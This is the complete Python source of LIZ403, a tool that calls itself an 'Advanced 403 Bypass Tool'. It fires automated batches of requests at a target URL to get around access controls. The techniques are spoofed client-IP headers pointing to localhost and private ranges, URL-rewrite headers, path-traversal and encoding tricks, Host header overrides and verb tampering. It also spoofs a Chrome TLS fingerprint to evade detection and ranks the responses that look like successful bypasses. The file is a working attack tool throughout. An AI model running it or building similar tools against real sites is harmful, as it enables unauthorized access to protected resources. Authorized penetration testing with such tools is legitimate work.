#!/usr/bin/env python3
"""
LIZ403 - Advanced 403 Bypass Tool
Python implementation with TLS fingerprint evasion
"""

import asyncio
import hashlib 
import argparse
import sys
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, urljoin, quote

from curl_cffi.requests import AsyncSession

# ============ Config ============

@dataclass
class Config:
    target: str
    method: str = "GET"
    custom_headers: dict = field(default_factory=dict)
    bypass_ip: Optional[str] = None
    proxy: Optional[str] = None
    timeout: int = 10
    delay: float = 0.0
    verbose: bool = False

# ============ Payloads ============

IP_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Client-IP",
    "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "True-Client-IP", "Cluster-Client-IP", "X-ProxyUser-Ip"
]

REWRITE_HEADERS = [
    "X-Original-URL", "X-Rewrite-URL", "X-Original-Path", "X-HTTP-Method-Override"
]

LOCAL_IPS = ["127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "localhost",
             "10.0.0.1", "172.16.0.1", "192.168.1.1"]

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "HEAD", "CONNECT"]

PATH_SUFFIXES = ["/", "//", "/.", "/..;/", "/%2e/", "/..%2f", ";", "%20", "%09", "%00", ".json", ".html"]

PATH_PREFIXES = ["/%2e/", "/..;/", "//", "/./", "/;/"]

# ============ Response Model ============

@dataclass
class ProbeResult:
    technique: str
    url: str
    status: int
    length: int
    body_hash: str
    headers: dict
    payload: dict
    score: int = 0
    reason: str = ""

# ============ Core Engine ============

class LIZ403:
    def __init__(self, config: Config):
        self.cfg = config
        self.baseline: Optional[ProbeResult] = None
        self.results: list[ProbeResult] = []
        self.session: Optional[AsyncSession] = None

    async def __aenter__(self):
        self.session = AsyncSession(
            impersonate="chrome120",  # TLS fingerprint spoofing
            timeout=self.cfg.timeout,
            proxy=self.cfg.proxy if self.cfg.proxy else None,
            verify=False
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def _request(self, url: str, method: str = "GET",
                       headers: dict = None, params: dict = None) -> Optional[ProbeResult]:
        h = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        if self.cfg.custom_headers:
            h.update(self.cfg.custom_headers)
        if headers:
            h.update(headers)

        try:
            resp = await self.session.request(
                method=method, url=url, headers=h, params=params,
                allow_redirects=False
            )
            body = resp.content if hasattr(resp, 'content') else resp.text.encode()
            return ProbeResult(
                technique="baseline", url=url, status=resp.status_code,
                length=len(body), body_hash=hashlib.md5(body).hexdigest(),
                headers=dict(resp.headers), payload={"headers": h, "method": method}
            )
        except Exception as e:
            if self.cfg.verbose:
                print(f"  [!] Request error: {e}")
            return None

    async def calibrate(self):
        parsed = urlparse(self.cfg.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        base_path = parsed.path or "/"

        calibration_urls = [
            urljoin(base, base_path + "/liz403_calib_123456"),
            urljoin(base, base_path + "/liz403_calib_abcdef"),
        ]

        for u in calibration_urls:
            await self._request(u)

        target_r = await self._request(self.cfg.target)
        if target_r:
            self.baseline = target_r
            if self.cfg.verbose:
                print(f"  [*] Baseline: {target_r.status} ({target_r.length}b)")

    def score_result(self, r: ProbeResult) -> int:
        if not self.baseline:
            return 0
        score = 0
        reasons = []

        if self.baseline.status == 403:
            if r.status == 200:
                score += 60; reasons.append("403=>200")
            elif r.status in (301, 302, 307, 308):
                score += 30; reasons.append(f"403=>{r.status}")
            elif r.status in (401, 404):
                score += 5; reasons.append(f"403=>{r.status}")

        if r.length != self.baseline.length:
            delta = abs(r.length - self.baseline.length)
            if delta > 500:
                score += 20; reasons.append(f"len Δ{delta}")
            elif delta > 100:
                score += 10; reasons.append(f"len Δ{delta}")

        if r.body_hash != self.baseline.body_hash:
            score += 10; reasons.append("body changed")

        if r.headers.get("Location") != self.baseline.headers.get("Location"):
            if r.headers.get("Location"):
                score += 15; reasons.append("Location changed")

        r.reason = ", ".join(reasons) if reasons else "similar to baseline"
        return score

    # ---------- Techniques ----------

    async def technique_verbs(self):
        for method in METHODS:
            r = await self._request(self.cfg.target, method=method)
            if r:
                r.technique = f"verb-{method}"
                r.score = self.score_result(r)
                self.results.append(r)
            if self.cfg.delay: await asyncio.sleep(self.cfg.delay)

    async def technique_verbs_case(self):
        variants = ["get", "Get", "gEt", "pOsT", "POST", "put", "PUT"]
        for m in variants:
            r = await self._request(self.cfg.target, method=m.upper() if m.isupper() else m)
            if r:
                r.technique = f"verb-case-{m}"
                r.score = self.score_result(r)
                self.results.append(r)
            if self.cfg.delay: await asyncio.sleep(self.cfg.delay)

    async def technique_headers(self):
        tasks = []

        for header in IP_HEADERS:
            for ip in LOCAL_IPS:
                tasks.append((header, ip, f"hdr-{header}"))

        for header in REWRITE_HEADERS:
            tasks.append((header, "/", f"hdr-{header}"))
            tasks.append((header, self.cfg.target, f"hdr-{header}"))

        for header, value, name in tasks:
            h = {header: value}
            r = await self._request(self.cfg.target, headers=h)
            if r:
                r.technique = name
                r.score = self.score_result(r)
                self.results.append(r)
            if self.cfg.delay: await asyncio.sleep(self.cfg.delay)

    async def technique_paths(self):
        parsed = urlparse(self.cfg.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path.rstrip("/")

        variants = []

        for suffix in PATH_SUFFIXES:
            variants.append((f"{self.cfg.target}{suffix}", f"path-suffix-{suffix}"))

        for prefix in PATH_PREFIXES:
            variants.append((f"{base}{prefix}{path}", f"path-prefix-{prefix}"))

        if path:
            variants.append((f"{base}/{path[1:].swapcase() if len(path) > 1 else path.upper()}", "path-case"))

        variants.append((f"{base}/{quote(quote(path.lstrip('/')))}", "path-double-encode"))
        variants.append((f"{base}/{quote(path.lstrip('/'))}", "path-encode"))

        for url, name in variants:
            r = await self._request(url)
            if r:
                r.technique = name
                r.score = self.score_result(r)
                self.results.append(r)
            if self.cfg.delay: await asyncio.sleep(self.cfg.delay)

    async def technique_host_override(self):
        parsed = urlparse(self.cfg.target)
        hosts = ["localhost", "127.0.0.1", "internal", parsed.hostname]
        for h in hosts:
            r = await self._request(self.cfg.target, headers={"Host": h})
            if r:
                r.technique = f"host-{h}"
                r.score = self.score_result(r)
                self.results.append(r)
            if self.cfg.delay: await asyncio.sleep(self.cfg.delay)

    async def technique_method_override(self):
        for m in ["PUT", "DELETE", "PATCH"]:
            r = await self._request(self.cfg.target, method="POST",
                                    headers={"X-HTTP-Method-Override": m})
            if r:
                r.technique = f"method-override-{m}"
                r.score = self.score_result(r)
                self.results.append(r)
            if self.cfg.delay: await asyncio.sleep(self.cfg.delay)

    # ---------- Main ----------

    async def run(self):
        print(f"\n[*] LIZ403 targeting: {self.cfg.target}")
        print("[*] Calibrating baseline...\n")

        await self.calibrate()

        if not self.baseline:
            print("[!] Calibration failed. Target unreachable?")
            return

        print(f"[*] Baseline status: {self.baseline.status} "
              f"({self.baseline.length} bytes)\n")

        techniques = [
            ("HTTP Method", self.technique_verbs),
            ("Verb Case", self.technique_verbs_case),
            ("Headers", self.technique_headers),
            ("Paths", self.technique_paths),
            ("Host Override", self.technique_host_override),
            ("Method Override", self.technique_method_override),
        ]

        for name, func in techniques:
            print(f"[*] Running: {name}")
            await func()

        self.results.sort(key=lambda r: r.score, reverse=True)
        self.report()

    def report(self):
        print("\n" + "=" * 70)
        print("LIZ403 RESULTS")
        print("=" * 70)

        likely = [r for r in self.results if r.score >= 50]
        interesting = [r for r in self.results if 20 <= r.score < 50]

        if likely:
            print("\n[ HIGH CONFIDENCE BYPASS ]")
            for r in likely[:10]:
                print(f"\n  Score: {r.score} | {r.technique}")
                print(f"  Status: {r.status} | Length: {r.length}")
                print(f"  Reason: {r.reason}")
                print(f"  URL: {r.url}")

        if interesting:
            print("\n[ INTERESTING VARIATIONS ]")
            for r in interesting[:5]:
                print(f"  {r.score:>3} | {r.status} | {r.technique} | {r.reason}")

        total = len(self.results)
        print(f"\n[*] Total probes: {total}")
        print(f"[*] Likely bypasses: {len(likely)}")


# ============ CLI ============

def main():
    parser = argparse.ArgumentParser(
        description="LIZ403 - Advanced 403 Bypass Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python LIZ403.py -u https://target.com/admin
  python LIZ403.py -u https://target.com/admin -x http://127.0.0.1:8080
  python LIZ403.py -u https://target.com/admin -H "Authorization: Bearer xxx"
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-x", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-H", "--header", action="append", default=[],
                        help="Custom header (can repeat)")
    parser.add_argument("-d", "--delay", type=float, default=0.0,
                        help="Delay between requests (seconds)")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                        help="Request timeout (seconds)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    custom_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    cfg = Config(
        target=args.url,
        proxy=args.proxy,
        custom_headers=custom_headers,
        delay=args.delay,
        timeout=args.timeout,
        verbose=args.verbose
    )

    async def run():
        async with LIZ403(cfg) as tool:
            await tool.run()

    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)


if __name__ == "__main__":
    
    main()
